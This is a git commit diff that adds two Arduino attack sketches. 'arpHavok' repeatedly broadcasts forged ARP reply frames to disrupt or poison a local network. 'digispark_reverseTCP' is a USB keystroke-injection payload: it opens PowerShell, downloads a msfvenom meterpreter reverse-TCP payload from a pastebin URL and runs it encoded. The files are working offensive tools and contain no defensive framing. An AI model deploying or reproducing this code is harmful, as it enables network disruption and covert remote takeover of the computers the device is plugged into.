ada71bc7f7b13c72eccf5baa2c1d2fe8a3b016e0
Marise Hayashi <limitedeternity@users.noreply.github.com>
2017-08-31 19:55:14 +0300

    Add files via upload

---
+++ arpHavok/arpHavok.ino
@@ -0,0 +1,71 @@
+#include <SPI.h> 
+#include <Ethernet.h>
+#include <EthernetUdp.h>
+
+byte mac[] = {
+  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED
+};
+
+IPAddress broadcastIP(255, 255, 255, 255);
+unsigned int broadcastPort = 6555;
+
+unsigned int localPort = 8888;
+bool connection = false;
+
+int packetRate = 20;
+
+char packetBuffer[48];
+uint8_t _data[48] = {
+  /* 0  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination MAC
+  /* 6  */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source MAC
+  /* 12 */ 0x08, 0x06, //frame type (ARP)
+  /* 14 */ 0x00, 0x01, //ethernet
+  /* 16 */ 0x08, 0x00, //ipv4
+  /* 18 */ 0x06, 0x04, //size, protocol size
+  /* 20 */ 0x00, 0x02, //opcode (1:request, 2:reply)
+  /* 22 */ 0x01, 0x01, 0x01, 0x01c, 0x01, 0x01, //source MAC
+  /* 28 */ 0xc0, 0xa8, 0x02, 0x01, //source IP
+  /* 32 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination MAC
+  /* 38 */ 0xFF, 0xFF, 0xFF, 0xFF, //destination IP (255.255.255.255)
+};
+
+EthernetUDP Udp;
+
+void sendARP() {
+for (int i = 0; i < packetRate; i++) {
+      digitalWrite(LED_BUILTIN, HIGH);
+
+      for (int x = 0; x < 48; x++) {
+          packetBuffer[x] = _data[x];
+      }
+
+      Udp.beginPacket(broadcastIP, broadcastPort);
+      Udp.write(packetBuffer, 48);
+      Udp.endPacket();
+      delay(1000 / packetRate);
+      digitalWrite(LED_BUILTIN, LOW);
+  } 
+  
+}
+void setup() {
+  pinMode(LED_BUILTIN, OUTPUT);
+
+  if (Ethernet.begin(mac) == 0) {
+      connection = false;
+      digitalWrite(LED_BUILTIN, LOW);  
+  } else {
+      connection = true;
+      Udp.begin(localPort);  
+  }
+
+  while (!connection) {
+    setup();
+ }
+}
+
+void loop() {
+  if (connection) {
+      sendARP();
+      delay(100);
+  }
+}
---
+++ digispark_reverseTCP/reverseTCP.ino
@@ -0,0 +1,40 @@
+#include "DigiKeyboard.h"
+
+#define KEY_ENTER       40
+#define KEY_DELETE      76
+
+void setup() {
+  DigiKeyboard.update();
+}
+
+
+void loop() {
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.update();
+  DigiKeyboard.delay(100);
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_DELETE);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+
+  // msfvenom -p windows/meterpreter/reverse_tcp LHOST=<handler/YOUR ip> LPORT=4444 -f psh-cmd –smallest
+  DigiKeyboard.print("$url = 'pastebin.com/raw/<msfvenom_payload>'");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("$result = Invoke-WebRequest -Uri $url");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("powershell.exe -nop -e $result.content");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+
+  DigiKeyboard.delay(90000000);
+}
